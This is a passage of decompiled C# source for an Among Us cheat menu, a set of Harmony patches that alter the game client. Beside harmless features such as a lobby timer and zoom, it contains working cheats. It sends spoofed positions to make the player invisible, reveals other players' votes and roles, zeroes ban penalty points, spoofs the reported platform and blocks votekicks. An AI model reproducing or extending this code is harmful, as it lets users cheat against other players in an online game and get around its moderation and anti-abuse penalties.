      return ChocooPlugin.LobbyTimerTracker.TimerStartTS == 0L ? 600f : Mathf.Max(0.0f, 600f - (float) (DateTimeOffset.UtcNow.ToUnixTimeSeconds() - ChocooPlugin.LobbyTimerTracker.TimerStartTS));
    }

    public static void ResetTimer()
    {
      ChocooPlugin.LobbyTimerTracker.TimerStartTS = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
    }
  }

  [HarmonyPatch(typeof (LobbyBehaviour), "Start")]
  public static class LobbyTimerStartPatch
  {
    [HarmonyPostfix]
    public static void Postfix() => ChocooPlugin.LobbyTimerTracker.ResetTimer();
  }

  [HarmonyPatch(typeof (LobbyBehaviour), "FixedUpdate")]
  public static class ShowLobbyTimerPatch
  {
    private static TextMeshPro timerText;
    private static float _repingTimer;

    [HarmonyPostfix]
    public static void Postfix(LobbyBehaviour __instance)
    {
      ChocooPlugin.ShowLobbyTimerPatch._repingTimer += Time.deltaTime;
      if ((double) ChocooPlugin.ShowLobbyTimerPatch._repingTimer >= 30.0)
      {
        ChocooPlugin.ShowLobbyTimerPatch._repingTimer = 0.0f;
        if (!ChocooPlugin.StealthMode && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
        {
          ChocooPlugin.TrackOwnModUsage();
          ChocooPlugin.BroadcastMenuIdentification();
        }
      }
      if (!ChocooPlugin.ShowLobbyTimerEnabled)
      {
        if (!Object.op_Inequality((Object) ChocooPlugin.ShowLobbyTimerPatch.timerText, (Object) null))
          return;
        Object.Destroy((Object) ((Component) ChocooPlugin.ShowLobbyTimerPatch.timerText).gameObject);
        ChocooPlugin.ShowLobbyTimerPatch.timerText = (TextMeshPro) null;
      }
      else
      {
        if (!((InnerNetClient) AmongUsClient.Instance).AmHost)
          return;
        try
        {
          float remainingTime = ChocooPlugin.LobbyTimerTracker.GetRemainingTime();
          if (Object.op_Equality((Object) ChocooPlugin.ShowLobbyTimerPatch.timerText, (Object) null))
          {
            TextMeshPro gameRoomNameCode = Object.FindObjectOfType<GameStartManager>()?.GameRoomNameCode;
            if (Object.op_Inequality((Object) gameRoomNameCode, (Object) null))
            {
              ChocooPlugin.ShowLobbyTimerPatch.timerText = Object.Instantiate<TextMeshPro>(gameRoomNameCode, gameRoomNameCode.transform.parent);
              ((Object) ChocooPlugin.ShowLobbyTimerPatch.timerText).name = "LobbyTimerText";
              ChocooPlugin.ShowLobbyTimerPatch.timerText.transform.localPosition = Vector3.op_Addition(gameRoomNameCode.transform.localPosition, new Vector3(0.0f, -0.5f, 0.0f));
              ((TMP_Text) ChocooPlugin.ShowLobbyTimerPatch.timerText).fontSize = 3f;
              ((TMP_Text) ChocooPlugin.ShowLobbyTimerPatch.timerText).alignment = (TextAlignmentOptions) 514;
            }
          }
          if (!Object.op_Inequality((Object) ChocooPlugin.ShowLobbyTimerPatch.timerText, (Object) null))
            return;
          int num1 = Mathf.FloorToInt(remainingTime / 60f);
          int num2 = Mathf.FloorToInt(remainingTime % 60f);
          Color color;
          if ((double) remainingTime >= 180.0)
          {
            // ISSUE: explicit constructor call
            ((Color) ref color).\u002Ector(0.0f, 0.7f, 1f);
          }
          else
            color = (double) remainingTime < 120.0 ? ((double) remainingTime < 60.0 ? Color.red : Color.Lerp(new Color(1f, 0.5f, 0.0f), Color.yellow, (float) (((double) remainingTime - 60.0) / 60.0))) : Color.Lerp(Color.yellow, Color.cyan, (float) (((double) remainingTime - 120.0) / 60.0));
          ((Graphic) ChocooPlugin.ShowLobbyTimerPatch.timerText).color = color;
          ((TMP_Text) ChocooPlugin.ShowLobbyTimerPatch.timerText).text = $"<size=70%>Lobby closes in: {num1:00}:{num2:00}</size>";
          if (Mathf.FloorToInt(remainingTime) == 60 && Mathf.FloorToInt((float) ((double) remainingTime % 1.0 * 10.0)) == 0)
            ((TMP_Text) ChocooPlugin.ShowLobbyTimerPatch.timerText).fontSize = 3.2f;
          else
            ((TMP_Text) ChocooPlugin.ShowLobbyTimerPatch.timerText).fontSize = 3f;
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("ShowLobbyTimer error: " + ex.Message));
        }
      }
    }

    public static void ResetTimer()
    {
      if (!Object.op_Inequality((Object) ChocooPlugin.ShowLobbyTimerPatch.timerText, (Object) null))
        return;
      Object.Destroy((Object) ((Component) ChocooPlugin.ShowLobbyTimerPatch.timerText).gameObject);
      ChocooPlugin.ShowLobbyTimerPatch.timerText = (TextMeshPro) null;
    }
  }

  [HarmonyPatch(typeof (AmongUsClient), "OnGameEnd")]
  public static class ResetLobbyTimerPatch
  {
    [HarmonyPostfix]
    public static void Postfix()
    {
      ChocooPlugin.ShowLobbyTimerPatch.ResetTimer();
      ChocooPlugin.LobbyTimerTracker.TimerStartTS = 0L;
    }
  }

  [HarmonyPatch(typeof (Console), "CanUse")]
  public static class ImpostorTasksPatch
  {
    [HarmonyPrefix]
    public static void Prefix(Console __instance)
    {
      if (!ChocooPlugin.ImpostorTasksEnabled)
        return;
      __instance.AllowImpostor = true;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "MurderPlayer")]
  public static class KillNotificationPatch
  {
    private static readonly HashSet<string> _recentKills = new HashSet<string>();

    [HarmonyPrefix]
    public static void Prefix(PlayerControl __instance, PlayerControl target)
    {
      if (!ChocooPlugin.KillNotificationEnabled)
        return;
      try
      {
        if (Object.op_Equality((Object) __instance, (Object) null) || Object.op_Equality((Object) target, (Object) null) || ((InnerNetObject) __instance).AmOwner)
          return;
        string key = $"{__instance.PlayerId}:{target.PlayerId}";
        if (!ChocooPlugin.KillNotificationPatch._recentKills.Add(key))
          return;
        HudManager instance = DestroyableSingleton<HudManager>.Instance;
        if (instance != null)
          MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) instance, ChocooPlugin.KillNotificationPatch.ClearKeyNextFrame(key));
        string str1 = __instance.Data?.PlayerName ?? "Unknown";
        string str2 = target.Data?.PlayerName ?? "Unknown";
        string roomFromPosition = ChocooPlugin.KillNotificationPatch.GetRoomFromPosition(target.GetTruePosition());
        string str3 = __instance.Data?.PlayerName ?? "Unknown";
        string str4 = __instance.CurrentOutfit?.PlayerName ?? str3;
        bool flag = str4 != str3;
        string str5;
        if (target.protectedByGuardianId != -1)
        {
          string str6;
          if (!flag)
            str6 = $"<color=#FF6600>{str1}</color> tried to kill <color=#800080>{str2}</color> in <color=#00BFFF>{roomFromPosition}</color> <color=#FFD700>(Protected)</color>";
          else
            str6 = $"<color=#FF6600>{str3} (as {str4})</color> tried to kill <color=#800080>{str2}</color> in <color=#00BFFF>{roomFromPosition}</color> <color=#FFD700>(Protected)</color>";
          str5 = str6;
        }
        else
        {
          string str7;
          if (!flag)
            str7 = $"<color=#FF0000>{str1}</color> killed <color=#800080>{str2}</color> in <color=#00BFFF>{roomFromPosition}</color>";
          else
            str7 = $"<color=#FF0000>{str3} (as {str4})</color> killed <color=#800080>{str2}</color> in <color=#00BFFF>{roomFromPosition}</color>";
          str5 = str7;
        }
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Chat, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, str5, true);
        ChocooPlugin.Logger.LogInfo((object) ("[Kill Notification] " + str5));
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Kill Notification error: " + ex.Message));
      }
    }

    private static IEnumerator ClearKeyNextFrame(string key)
    {
      yield return (object) null;
      ChocooPlugin.KillNotificationPatch._recentKills.Remove(key);
    }

    private static string GetRoomFromPosition(Vector2 position)
    {
      if (Object.op_Equality((Object) ShipStatus.Instance, (Object) null))
        return "Unknown";
      foreach (PlainShipRoom allRoom in (Il2CppArrayBase<PlainShipRoom>) ShipStatus.Instance.AllRooms)
      {
        if (!Object.op_Equality((Object) allRoom, (Object) null))
        {
          foreach (Collider2D componentsInChild in ((Component) allRoom).GetComponentsInChildren<Collider2D>())
          {
            if (Object.op_Inequality((Object) componentsInChild, (Object) null) && componentsInChild.OverlapPoint(position))
              return allRoom.RoomId.ToString();
          }
        }
      }
      return "Unknown";
    }
  }

  [HarmonyPatch(typeof (VoteBanSystem))]
  public static class DisableVotekicksPatch
  {
    [HarmonyPatch("AddVote")]
    [HarmonyPrefix]
    public static bool Prefix(int srcClient, int clientId)
    {
      try
      {
        if (!ChocooPlugin.DisableVotekicks || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
          return true;
        int hostId = ((InnerNetClient) AmongUsClient.Instance).HostId;
        if (clientId == hostId)
        {
          string str = ((InnerNetClient) AmongUsClient.Instance).GetClient(srcClient)?.PlayerName ?? "Client " + srcClient.ToString();
          ChocooPlugin.Logger.LogWarning((object) ("\uD83D\uDEE1️ Blocked votekick against host from " + str));
          if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
            DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=red>{str}</color> tried to kick you!", true);
          return false;
        }
        if (srcClient == hostId)
          return true;
        ClientData client1 = ((InnerNetClient) AmongUsClient.Instance).GetClient(srcClient);
        ClientData client2 = ((InnerNetClient) AmongUsClient.Instance).GetClient(clientId);
        string str1 = client1?.PlayerName ?? "Client " + srcClient.ToString();
        string str2 = client2?.PlayerName ?? "Client " + clientId.ToString();
        ChocooPlugin.Logger.LogWarning((object) $"\uD83D\uDEAB Blocked votekick: {str1} tried to vote {str2}");
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=yellow>[VoteLock]</color> {str1} tried to vote {str2}, but voting is disabled.", true);
        return false;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("DisableVotekicks error: " + ex.Message));
        return true;
      }
    }
  }

  [HarmonyPatch(typeof (HudManager), "Update")]
  public static class HudManager_Update
  {
    [HarmonyPostfix]
    public static void Postfix(HudManager __instance)
    {
      try
      {
        if (ChocooPlugin.AlwaysShowChatEnabled)
          ((Component) __instance.Chat).gameObject.SetActive(true);
        if (ChocooPlugin.NoShadowsEnabled)
          ((Component) __instance.ShadowQuad).gameObject.SetActive(false);
        else
          ((Component) __instance.ShadowQuad).gameObject.SetActive(true);
        if (ChocooPlugin.ZoomOutEnabled)
        {
          ChocooPlugin.resolutionChangeNeeded = true;
          if ((double) Input.GetAxis("Mouse ScrollWheel") < 0.0)
          {
            ++Camera.main.orthographicSize;
            ++__instance.UICamera.orthographicSize;
            ResolutionManager.ResolutionChanged.Invoke((float) Screen.width / (float) Screen.height, Screen.width, Screen.height, Screen.fullScreen);
          }
          else if ((double) Input.GetAxis("Mouse ScrollWheel") > 0.0 && (double) Camera.main.orthographicSize > 3.0)
          {
            --Camera.main.orthographicSize;
            --__instance.UICamera.orthographicSize;
            ResolutionManager.ResolutionChanged.Invoke((float) Screen.width / (float) Screen.height, Screen.width, Screen.height, Screen.fullScreen);
          }
        }
        else
        {
          Camera.main.orthographicSize = 3f;
          __instance.UICamera.orthographicSize = 3f;
          if (ChocooPlugin.resolutionChangeNeeded)
          {
            ResolutionManager.ResolutionChanged.Invoke((float) Screen.width / (float) Screen.height, Screen.width, Screen.height, Screen.fullScreen);
            ChocooPlugin.resolutionChangeNeeded = false;
          }
        }
        if (!Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null) || !Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics, (Object) null))
          return;
        float num = ChocooPlugin.InvisibilityEnabled ? 0.5f : 1f;
        if (PlayerControl.LocalPlayer.cosmetics.currentBodySprite != null && Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.currentBodySprite.BodySprite, (Object) null))
          PlayerControl.LocalPlayer.cosmetics.currentBodySprite.BodySprite.color = new Color(1f, 1f, 1f, num);
        if (Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.hat, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.hat.FrontLayer, (Object) null))
        {
          PlayerControl.LocalPlayer.cosmetics.hat.FrontLayer.color = new Color(1f, 1f, 1f, num);
          if (Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.hat.BackLayer, (Object) null))
            PlayerControl.LocalPlayer.cosmetics.hat.BackLayer.color = new Color(1f, 1f, 1f, num);
        }
        if (Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.visor, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.visor.Image, (Object) null))
          PlayerControl.LocalPlayer.cosmetics.visor.Image.color = new Color(1f, 1f, 1f, num);
        if (Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.skin, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.skin.layer, (Object) null))
          PlayerControl.LocalPlayer.cosmetics.skin.layer.color = new Color(1f, 1f, 1f, num);
        if (Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.currentPet, (Object) null))
        {
          foreach (SpriteRenderer componentsInChild in ((Component) PlayerControl.LocalPlayer.cosmetics.currentPet).GetComponentsInChildren<SpriteRenderer>())
          {
            if (Object.op_Inequality((Object) componentsInChild, (Object) null))
              componentsInChild.color = new Color(1f, 1f, 1f, num);
          }
        }
        if (Object.op_Inequality((Object) PlayerControl.LocalPlayer.cosmetics.nameText, (Object) null))
        {
          Color color = ((Graphic) PlayerControl.LocalPlayer.cosmetics.nameText).color;
          ((Graphic) PlayerControl.LocalPlayer.cosmetics.nameText).color = new Color(color.r, color.g, color.b, num);
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("HudManager_Update error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (CustomNetworkTransform), "Serialize")]
  public static class InvisibilitySerializePatch
  {
    public static bool Prefix(
      CustomNetworkTransform __instance,
      MessageWriter writer,
      bool initialState,
      ref bool __result)
    {
      if (((!ChocooPlugin.InvisibilityEnabled ? 1 : (!((InnerNetObject) __instance).AmOwner ? 1 : 0)) | (initialState ? 1 : 0)) != 0)
        return true;
      ++__instance.lastSequenceId;
      writer.Write(__instance.lastSequenceId);
      writer.WritePacked(1);
      NetHelpers.WriteVector2(new Vector2(-121f, -121f), writer);
      __result = true;
      return false;
    }
  }

  [HarmonyPatch(typeof (CustomNetworkTransform), "RpcSnapTo")]
  public static class InvisibilityRpcSnapToPatch
  {
    public static bool Prefix(CustomNetworkTransform __instance, Vector2 position)
    {
      if (!ChocooPlugin.InvisibilityEnabled || Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Inequality((Object) ((Component) __instance).gameObject, (Object) ((Component) PlayerControl.LocalPlayer).gameObject))
        return true;
      ushort num = ++__instance.lastSequenceId;
      MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) __instance).NetId, (byte) 21, (SendOption) 0, -1);
      NetHelpers.WriteVector2(new Vector2(-121f, -121f), messageWriter);
      messageWriter.Write(num);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
      __instance.SnapTo(position);
      return false;
    }
  }

  [HarmonyPatch(typeof (GameContainer), "SetupGameInfo")]
  public static class MoreLobbyInfoPatch
  {
    [HarmonyPostfix]
    public static void Postfix(GameContainer __instance)
    {
      if (!ChocooPlugin.MoreLobbyInfoEnabled)
        return;
      string trueHostName = __instance.gameListing.TrueHostName;
      int age = __instance.gameListing.Age;
      string str1 = $"Age: {age / 60}:{(age % 60 < 10 ? (object) "0" : (object) "")}{age % 60}";
      string str2 = __instance.gameListing.Platform.ToString();
      ((TMP_Text) __instance.capacity).text = $"<size=40%><#0000>000000000000000</color>\n{trueHostName}\n{((TMP_Text) __instance.capacity).text}\n<#fb0>{GameCode.IntToGameName(__instance.gameListing.GameId)}</color>\n<#b0f>{str2}</color>\n{str1}\n<#0000>000000000000000</color></size>";
    }
  }

  [HarmonyPatch]
  public static class AvoidPenaltiesPatch
  {
    [HarmonyPostfix]
    public static void Postfix(PlayerBanData __instance, ref int __result)
    {
      if (!ChocooPlugin.AvoidPenaltiesEnabled)
        return;
      __instance.BanPoints = 0.0f;
      __result = 0;
    }
  }

  [HarmonyPatch(typeof (MeetingHud), "Update")]
  public static class RevealVotesPatch
  {
    internal static List<int> _votedPlayers = new List<int>();

    [HarmonyPrefix]
    public static void Prefix(MeetingHud __instance)
    {
      if (!ChocooPlugin.RevealVotesEnabled)
        return;
      try
      {
        if (__instance.state >= 4)
          return;
        foreach (PlayerVoteArea playerState1 in (Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)
        {
          if (Object.op_Implicit((Object) playerState1))
          {
            NetworkedPlayerInfo playerById = GameData.Instance.GetPlayerById(playerState1.TargetPlayerId);
            if (Object.op_Inequality((Object) playerById, (Object) null) && !playerById.Disconnected && (int) playerState1.VotedFor != (int) PlayerVoteArea.HasNotVoted && (int) playerState1.VotedFor != (int) PlayerVoteArea.MissedVote && (int) playerState1.VotedFor != (int) PlayerVoteArea.DeadVote && !ChocooPlugin.RevealVotesPatch._votedPlayers.Contains((int) playerState1.TargetPlayerId))
            {
              ChocooPlugin.RevealVotesPatch._votedPlayers.Add((int) playerState1.TargetPlayerId);
              if ((int) playerState1.VotedFor != (int) PlayerVoteArea.SkippedVote)
              {
                foreach (PlayerVoteArea playerState2 in (Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)
                {
                  if ((int) playerState2.TargetPlayerId == (int) playerState1.VotedFor)
                  {
                    __instance.BloopAVoteIcon(playerById, 0, ((Component) playerState2).transform);
                    break;
                  }
                }
              }
              else if (Object.op_Implicit((Object) __instance.SkippedVoting))
                __instance.BloopAVoteIcon(playerById, 0, __instance.SkippedVoting.transform);
            }
          }
        }
        foreach (PlayerVoteArea playerState in (Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)
        {
          if (Object.op_Implicit((Object) playerState))
          {
            VoteSpreader component = ((Component) ((Component) playerState).transform).GetComponent<VoteSpreader>();
            if (Object.op_Implicit((Object) component))
            {
              foreach (Component vote in component.Votes)
                vote.gameObject.SetActive(true);
            }
          }
        }
        if (Object.op_Implicit((Object) __instance.SkippedVoting))
          __instance.SkippedVoting.SetActive(true);
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("RevealVotes error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (MeetingHud), "PopulateResults")]
  public static class RevealVotesCleanupPatch
  {
    [HarmonyPrefix]
    public static void Prefix(MeetingHud __instance)
    {
      if (!ChocooPlugin.RevealVotesEnabled)
        return;
      try
      {
        foreach (PlayerVoteArea playerState in (Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)
        {
          if (Object.op_Implicit((Object) playerState))
          {
            VoteSpreader component = ((Component) ((Component) playerState).transform).GetComponent<VoteSpreader>();
            if (Object.op_Implicit((Object) component) && component.Votes.Count != 0)
            {
              foreach (Object vote in component.Votes)
                Object.DestroyImmediate(vote);
              component.Votes.Clear();
            }
          }
        }
        if (Object.op_Implicit((Object) __instance.SkippedVoting))
        {
          VoteSpreader component = ((Component) __instance.SkippedVoting.transform).GetComponent<VoteSpreader>();
          foreach (Object vote in component.Votes)
            Object.DestroyImmediate(vote);
          component.Votes.Clear();
        }
        ChocooPlugin.RevealVotesPatch._votedPlayers.Clear();
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("RevealVotesCleanup error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "SetName")]
  public static class PlayerNametagsPatch
  {
    [HarmonyPostfix]
    public static void Postfix(PlayerControl __instance)
    {
      ChocooPlugin.PlayerNametagsPatch.ApplyNametag(__instance);
    }

    public static void RefreshAll()
    {
      try
      {
        foreach (PlayerControl __instance in PlayerControl.AllPlayerControls.ToArray())
        {
          if (Object.op_Inequality((Object) __instance, (Object) null))
            ChocooPlugin.PlayerNametagsPatch.ApplyNametag(__instance);
        }
      }
      catch
      {
      }
    }

    public static void RestoreAll()
    {
      try
      {
        foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
        {
          if (!Object.op_Equality((Object) playerControl?.Data, (Object) null) && Object.op_Inequality((Object) playerControl.cosmetics?.nameText, (Object) null))
            ((TMP_Text) playerControl.cosmetics.nameText).text = playerControl.Data.PlayerName ?? "";
        }
      }
      catch
      {
      }
    }

    public static void ApplyNametag(PlayerControl __instance)
    {
      if (Object.op_Equality((Object) __instance, (Object) null) || Object.op_Equality((Object) __instance.Data, (Object) null) || __instance.Data.Disconnected || Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
        return;
      bool flag1 = ChocooPlugin.IsPlayerBlacklisted(__instance);
      bool flag2 = ChocooPlugin.SeeModUsersEnabled && ChocooPlugin.detectedModUsers.ContainsKey(__instance.PlayerId);
      if (!ChocooPlugin.ShowPlayerInfo && !ChocooPlugin.SeeRolesEnabled && !ChocooPlugin.ShowKillCooldown && !flag1 && !flag2)
      {
        if (!Object.op_Inequality((Object) __instance.cosmetics?.nameText, (Object) null))
          return;
        ((TMP_Text) __instance.cosmetics.nameText).text = __instance.Data.PlayerName ?? "";
      }
      else
      {
        try
        {
          NetworkedPlayerInfo data = __instance.Data;
          if (Object.op_Equality((Object) data.Role, (Object) null))
            return;
          string playerName = data.PlayerName;
          if (string.IsNullOrEmpty(playerName))
            return;
          string str1 = ChocooPlugin.PlayerNametagsPatch.GetNameTag(data, playerName);
          if (flag2)
            str1 = $"<color=#FF0000><size=70%>{ChocooPlugin.PlayerNametagsPatch.GetModMenuName(ChocooPlugin.detectedModUsers[__instance.PlayerId])} User</size></color>\r\n{str1}";
          int clientId;
          if (flag1)
          {
            str1 = "<color=#FF0000><size=70%>BLACKLIST</size></color>\r\n" + str1;
            string str2 = data.PlayerName ?? "unknown";
            clientId = data.ClientId;
            string str3 = clientId.ToString();
            string str4 = $"{str2}_{str3}";
            if (!ChocooPlugin.notifiedBlacklistedPlayers.Contains(str4))
            {
              ChocooPlugin.notifiedBlacklistedPlayers.Add(str4);
              string str5 = "";
              try
              {
                str5 = __instance.FriendCode;
              }
              catch
              {
              }
              if (string.IsNullOrEmpty(str5))
              {
                try
                {
                  str5 = data.FriendCode;
                }
                catch
                {
                }
              }
              if (string.IsNullOrEmpty(str5))
                str5 = "unknown";
              if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Chat, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
                DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=red>[BLACKLIST]</color> <color=orange>{data.PlayerName ?? "Unknown"}</color> ({str5}) is in your blacklist!", true);
            }
          }
          if (ChocooPlugin.AnticheatEnabled && ChocooPlugin.CheckAbnormalPlatforms && !((InnerNetObject) __instance).AmOwner)
          {
            try
            {
              ClientData clientFromCharacter = ((InnerNetClient) AmongUsClient.Instance).GetClientFromCharacter(__instance);
              if (clientFromCharacter != null && clientFromCharacter.PlatformData != null)
              {
                if (!ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.IsValidPlatform(clientFromCharacter.PlatformData))
                {
                  string str6 = data.PlayerName ?? "unknown";
                  clientId = data.ClientId;
                  string str7 = clientId.ToString();
                  string str8 = $"{str6}_{str7}_platform";
                  if (!ChocooPlugin.notifiedAbnormalPlatformPlayers.Contains(str8))
                  {
                    ChocooPlugin.notifiedAbnormalPlatformPlayers.Add(str8);
                    PlatformSpecificData platformData = clientFromCharacter.PlatformData;
                    string str9 = $"Platform: {platformData.Platform} | Name: {platformData.PlatformName} | XUID: {platformData.XboxPlatformId} | PSID: {platformData.PsnPlatformId}";
                    if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Chat, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
                      DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=purple>[ANTICHEAT]</color> <color=orange>{data.PlayerName ?? "Unknown"}</color>: Spoofed Platform detected\n<color=white><size=70%>{str9}</size></color>", true);
                    ChocooPlugin.detectionLog.Add(string.Format("[{0:HH:mm:ss}] {1}: Abnormal Platform ({2})", (object) DateTime.Now, (object) data.PlayerName, (object) str9));
                    ++ChocooPlugin.totalDetections;
                  }
                }
              }
            }
            catch
            {
            }
          }
          if (ChocooPlugin.AnticheatEnabled && ChocooPlugin.CheckAbnormalLevel && !((InnerNetObject) __instance).AmOwner)
          {
            try
            {
              uint playerLevel = data.PlayerLevel;
              if (playerLevel > ChocooPlugin.MaxAllowedLevel)
              {
                string str10 = data.PlayerName ?? "unknown";
                clientId = data.ClientId;
                string str11 = clientId.ToString();
                string str12 = $"{str10}_{str11}_level";
                if (!ChocooPlugin.notifiedAbnormalLevelPlayers.Contains(str12))
                {
                  ChocooPlugin.notifiedAbnormalLevelPlayers.Add(str12);
                  if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Chat, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
                    DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=purple>[ANTICHEAT]</color> <color=orange>{data.PlayerName ?? "Unknown"}</color>: Abnormal Level detected\n{$"<color=white><size=70%>Level: {(ValueType) (uint) ((int) playerLevel + 1)}</size></color>"}", true);
                  ChocooPlugin.detectionLog.Add(string.Format("[{0:HH:mm:ss}] {1}: Abnormal Level ({2})", (object) DateTime.Now, (object) data.PlayerName, (object) (uint) ((int) playerLevel + 1)));
                  ++ChocooPlugin.totalDetections;
                }
              }
            }
            catch
            {
            }
          }
          if (!Object.op_Inequality((Object) __instance.cosmetics?.nameText, (Object) null))
            return;
          ((TMP_Text) __instance.cosmetics.nameText).text = str1;
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("PlayerNametags error: " + ex.Message));
        }
      }
    }

    private static string GetModMenuName(byte rpcId)
    {
      switch (rpcId)
      {
        case 85:
          return "AmongUsMenu";
        case 89:
          return "NjordMenu";
        case 121:
          return "ChocooMenu";
        case 150:
          return "BetterAmongUs";
        case 154:
          return "GoatNetClient";
        case 162:
          return "NetMenu";
        case 164:
          return "SickoMenu";
        case 167:
          return "TuffMenu";
        case 176 /*0xB0*/:
          return "HostGuard";
        case 202:
          return "ModMenuCrew";
        case 219:
          return "BanMod";
        case 250:
          return "KillNetwork";
        case byte.MaxValue:
          return "UnknownMenu";
        default:
          return "Unknown Mod";
      }
    }

    public static string GetNameTag(NetworkedPlayerInfo playerInfo, string playerName, bool isChat = false)
    {
      string nameTag1 = playerName;
      if (Object.op_Equality((Object) playerInfo.Role, (Object) null) || playerInfo.Disconnected)
        return nameTag1;
      ClientData clientFromPlayerInfo = ((InnerNetClient) AmongUsClient.Instance).GetClientFromPlayerInfo(playerInfo);
      ClientData host = ((InnerNetClient) AmongUsClient.Instance).GetHost();
      int num = (int) playerInfo.PlayerLevel + 1;
      string str1 = "?";
      try
      {
        if (!string.IsNullOrEmpty(ChocooPlugin.SpoofedPlatform) && (int) playerInfo.PlayerId == (int) PlayerControl.LocalPlayer.PlayerId)
        {
          if (ChocooPlugin.SpoofedPlatform.Equals("Starlight", StringComparison.OrdinalIgnoreCase))
          {
            str1 = "Starlight";
          }
          else
          {
            Platforms result;
            if (Enum.TryParse<Platforms>(ChocooPlugin.SpoofedPlatform, true, out result))
              str1 = ChocooPlugin.PlayerNametagsPatch.GetPlatformShortName(result);
          }
        }
        else
          str1 = ChocooPlugin.PlayerNametagsPatch.GetPlatformShortName(clientFromPlayerInfo.PlatformData.Platform);
      }
      catch
      {
      }
      string str2 = playerInfo.FriendCode;
      if (string.IsNullOrEmpty(str2))
        str2 = "No Friend Code";
      byte playerId = playerInfo.PlayerId;
      bool flag1 = clientFromPlayerInfo == host;
      bool flag2 = Object.op_Inequality((Object) LobbyBehaviour.Instance, (Object) null);
      bool flag3 = Object.op_Inequality((Object) ShipStatus.Instance, (Object) null);
      string htmlStringRgb = ColorUtility.ToHtmlStringRGB(playerInfo.Role.TeamColor);
      bool flag4 = ChocooPlugin.SeeRolesEnabled && flag3 | isChat;
      bool flag5 = ChocooPlugin.ShowPlayerInfo && flag2 | isChat;
      string nameTag2;
      if (flag4)
      {
        if (flag5)
        {
          if (isChat)
            return $"<color=#{htmlStringRgb}>{nameTag1} <size=70%>{ChocooPlugin.PlayerNametagsPatch.GetRoleName(playerInfo)}</size></color> {$"<size=70%><color=#00FF00>Lv:{num}</color> <color=#9D4EDD>({str1})</color> "}{$"<color=#00FFFF>ID {playerId}</color></size>"}";
          if (flag1)
            nameTag2 = $"{$"<size=70%><color=#FFFF00>[HOST]</color> <color=#00FFFF>ID {playerId}</color> "}{$"<color=#00FF00>Level {num}</color> <color=#9D4EDD>({str1})</color></size>\r\n"}<color=#{htmlStringRgb}><size=70%>{ChocooPlugin.PlayerNametagsPatch.GetRoleName(playerInfo)}</size>\r\n{nameTag1}</color>";
          else
            nameTag2 = $"{$"<size=70%><color=#00FFFF>ID {playerId}</color> "}{$"<color=#00FF00>Level {num}</color> <color=#9D4EDD>({str1})</color></size>\r\n"}<color=#{htmlStringRgb}><size=70%>{ChocooPlugin.PlayerNametagsPatch.GetRoleName(playerInfo)}</size>\r\n{nameTag1}</color>";
        }
        else
        {
          if (isChat)
